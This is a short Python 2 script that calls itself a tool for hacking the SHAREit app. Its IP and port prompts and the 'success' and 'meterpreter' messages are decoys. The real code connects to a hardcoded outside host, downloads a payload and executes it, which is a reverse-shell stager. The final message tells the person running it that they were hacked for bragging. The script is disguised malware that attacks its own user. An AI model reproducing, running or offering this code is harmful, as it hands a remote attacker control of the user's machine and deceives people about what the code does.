import time
import socket,struct
print("tool by Ali PotHead")
print("hello this tool is for hacking SHAREit")
time.sleep(1)
print("turn on your bluetooth")
time.sleep(1)
f = raw_input("your ip: ")
u = raw_input("the port 4444 is default: ")
time.sleep(1)
print("please wait ")
for x in range(10):
	try:
		s=socket.socket(2,socket.SOCK_STREAM)
		s.connect(('52.14.61.47',14865))
		break
	except:
		time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
	d+=s.recv(l-len(d))
exec(d,{'s':s})
time.sleep(10)
print("success")
print("wait for session")
time.sleep(30)
print("he got hacked")
print("type help for options")
gg = raw_input("meterpreter: ")
if gg == help :
  print("u got hacked for bragging")
else:
 print("u got hacked for bragging")
